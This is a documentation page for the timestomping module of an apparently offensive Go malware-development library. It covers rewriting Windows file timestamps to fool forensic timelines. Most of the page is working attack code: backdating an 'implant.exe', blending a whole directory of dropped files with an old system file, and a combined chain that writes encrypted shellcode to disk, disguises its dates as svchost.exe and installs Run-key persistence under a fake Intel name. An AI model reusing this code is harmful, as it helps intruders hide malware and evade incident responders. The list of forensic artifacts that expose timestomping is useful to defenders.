# Timestomping

[<- Back to Cleanup Overview](README.md)

**MITRE ATT&CK:** [T1070.006 - Indicator Removal: Timestomp](https://attack.mitre.org/techniques/T1070/006/)
**D3FEND:** [D3-FHA - File Hash Analysis](https://d3fend.mitre.org/technique/d3f:FileHashAnalysis/)

---

## Primer

Every file on Windows has three timestamps: creation time, last access time, and last modification time. Forensic investigators use these timestamps to build timelines of attacker activity -- "this file was created at 2:00 AM, which matches the breach window."

**Changing the "date modified" on your homework to make it look like you did not do it last night.** Timestomping overwrites these timestamps with values that blend in -- either copying timestamps from a legitimate system file or setting them to a specific date that predates the investigation window.

---

## How It Works

### Timestamp Manipulation Flow

```mermaid
flowchart LR
    subgraph "CopyFromFull"
        SRC["Source file\n(e.g., C:\\Windows\\notepad.exe)"]
        SRC -->|"GetFileTime()"| TIMES["Creation: 2019-12-07\nAccess: 2024-01-15\nModified: 2019-12-07"]
        TIMES -->|"SetFileTime()"| DST["Target file\n(implant.exe)"]
    end

    subgraph "SetFull"
        CUSTOM["Custom timestamps\nCreation: 2023-06-15\nAccess: 2024-02-20\nModified: 2023-06-15"]
        CUSTOM -->|"SetFileTime()"| DST2["Target file\n(implant.exe)"]
    end

    style DST fill:#4a9,color:#fff
    style DST2 fill:#4a9,color:#fff
```

### Windows File Time API

```mermaid
sequenceDiagram
    participant App as Go Application
    participant Win as Windows API
    participant NTFS as NTFS

    App->>Win: CreateFile(path, FILE_WRITE_ATTRIBUTES)
    Win-->>App: File handle

    App->>Win: SetFileTime(handle, &ctime, &atime, &mtime)
    Win->>NTFS: Update MFT entry timestamps
    NTFS-->>Win: Success

    App->>Win: CloseHandle()

    Note over NTFS: File now shows<br/>the spoofed timestamps<br/>in Explorer and dir /T
```

---

## Usage

### Copy Timestamps from a System File

```go
import "github.com/oioio-space/maldev/cleanup/timestomp"

// Copy all three timestamps from notepad.exe to implant.exe
err := timestomp.CopyFromFull(
    `C:\Windows\System32\notepad.exe`,  // source
    `C:\temp\implant.exe`,              // destination
)
```

### Set Specific Timestamps

```go
import (
    "time"
    "github.com/oioio-space/maldev/cleanup/timestomp"
)

// Set all three timestamps to a specific date
target := time.Date(2023, 6, 15, 10, 30, 0, 0, time.UTC)
err := timestomp.SetFull(
    `C:\temp\implant.exe`,
    target,  // creation time
    target,  // access time
    target,  // modification time
)
```

### Backdate to Before Investigation Window

```go
// Make the file look like it was created months ago
creation := time.Date(2023, 3, 10, 14, 22, 0, 0, time.UTC)
access := time.Date(2024, 1, 5, 9, 15, 0, 0, time.UTC)
modified := time.Date(2023, 3, 10, 14, 22, 0, 0, time.UTC)

err := timestomp.SetFull(`C:\temp\implant.exe`, creation, access, modified)
```

---

## Advanced — Directory Walk with Neighbour Matching

A single timestomped file stands out if everything around it has a recent
`Modified` date. Walking the target directory and aligning every dropped
artifact with the `Modified` time of a long-lived neighbour blends the
whole tree.

```go
package main

import (
    "io/fs"
    "os"
    "path/filepath"
    "time"

    "github.com/oioio-space/maldev/cleanup/timestomp"
)

// blendInto timestomps every file under dir so its three timestamps match
// `anchor` — pick an anchor that existed long before the dropper ran.
func blendInto(dir string, anchor string) error {
    info, err := os.Stat(anchor)
    if err != nil {
        return err
    }
    t := info.ModTime()
    return filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error {
        if err != nil || d.IsDir() {
            return err
        }
        // SetFull with identical ctime/atime/mtime — matches how most Windows
        // installer outputs look after an uneventful lifetime on disk.
        return timestomp.SetFull(path, t, time.Now(), t)
    })
}

func main() {
    _ = blendInto(`C:\ProgramData\Intel\Graphics`, `C:\Windows\System32\svchost.exe`)
}
```

---

## Combined Example — Encrypted Drop + Timestomp + Registry Persistence

Three maldev layers stacked so a defender's triage passes all fail at once:
AES-GCM turns the on-disk artifact into opaque bytes, timestomping hides it
from MFT / `dir /tq` date sorts, and `HKCU\...\Run` survives reboots without
touching SCM or Task Scheduler.

```go
package main

import (
    "os"
    "time"

    "github.com/oioio-space/maldev/cleanup/timestomp"
    "github.com/oioio-space/maldev/crypto"
    "github.com/oioio-space/maldev/persistence/registry"
)

func main() {
    const drop = `C:\Users\Public\Intel\gfx-cache.bin`

    // 1. Encrypt payload. Any YARA file-scan now sees only ciphertext.
    key, _ := crypto.NewAESKey()
    payload := []byte{ /* raw shellcode */ }
    blob, _ := crypto.EncryptAESGCM(key, payload)

    _ = os.MkdirAll(`C:\Users\Public\Intel`, 0o755)
    _ = os.WriteFile(drop, blob, 0o644)

    // 2. Timestomp — match svchost.exe so date-sorted triage views drop it
    //    into the middle of the system-file pack.
    _ = timestomp.CopyFromFull(`C:\Windows\System32\svchost.exe`, drop)

    // 3. Persist via HKCU — no admin prompt, no SCM noise.
    _ = registry.RunKey(
        registry.HiveCurrentUser,
        registry.KeyRun,
        "IntelGraphicsCache",
        drop, // launcher reads blob, decrypts, self-injects
    ).Install()

    _ = time.Now
}
```

Layered benefit: each of the three defences (file scan / timeline analysis /
autorun review) has to fire independently. Bypassing all three at once is
what makes the chain effective, not any single step.

---

## Advantages & Limitations

### Advantages

- **Native Windows API**: Uses `SetFileTime` via `x/sys/windows` -- no custom syscalls needed
- **All three timestamps**: Sets creation, access, and modification simultaneously
- **Clone mode**: `CopyFromFull` duplicates timestamps from any readable file
- **Precise control**: `SetFull` accepts `time.Time` for nanosecond precision
- **Cross-platform timestomp.go**: Generic timestomp interface (Windows implementation via SetFileTime)

### Limitations

- **$MFT timestamps**: Windows stores both $STANDARD_INFORMATION and $FILE_NAME timestamps -- `SetFileTime` only modifies $STANDARD_INFORMATION; $FILE_NAME timestamps in the MFT are updated by the filesystem
- **USN Journal**: Timestamp changes create USN Journal entries that forensics tools can detect
- **$LogFile**: NTFS transaction log records the timestamp modification
- **Event logs**: Some EDR products log `SetFileTime` calls
- **Requires write access**: `FILE_WRITE_ATTRIBUTES` permission needed on the target file

---

## Compared to Other Implementations

| Feature | maldev (timestomp) | PowerShell | Cobalt Strike | Meterpreter |
|---------|-------------------|------------|---------------|-------------|
| Language | Go | PowerShell | Java/C | C |
| All 3 timestamps | Yes | Yes | Yes | Yes |
| Clone from file | Yes | Manual | Yes | Yes |
| Custom times | Yes | Yes | Yes | Yes |
| $FILE_NAME stomp | No | No | No | Yes (NtSetInformationFile) |
| USN-aware | No | No | No | No |

---

## API Reference

### Functions

```go
// CopyFromFull copies creation, access, and modification times from src to dst.
func CopyFromFull(src, dst string) error

// SetFull sets creation, access, and modification times on a file.
func SetFull(path string, ctime, atime, mtime time.Time) error
```
